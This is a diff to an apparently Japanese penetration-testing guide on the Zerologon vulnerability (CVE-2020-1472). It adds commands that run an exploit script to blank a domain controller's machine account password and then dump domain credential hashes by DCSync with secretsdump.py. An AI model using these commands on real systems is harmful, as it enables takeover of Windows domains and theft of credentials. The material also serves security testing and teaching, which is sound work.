@@ -27,7 +27,9 @@ Zerologon（CVE-2020-1472）は、Netlogon リモートプロトコルで使わ�
 ```
 # 脆弱性チェック
 nxc smb <DC_IP> -u '' -p '' -M zerologon
-# エクスプロイト後、マシンアカウントで DCSync
+# DC のマシンアカウントのパスワードを空にする
+python3 cve-2020-1472-exploit.py DC01 <DC_IP>
+# マシンアカウント（パスワード空）で DCSync
 secretsdump.py -just-dc -no-pass 'DC01$'@<DC_IP>
 ```
 
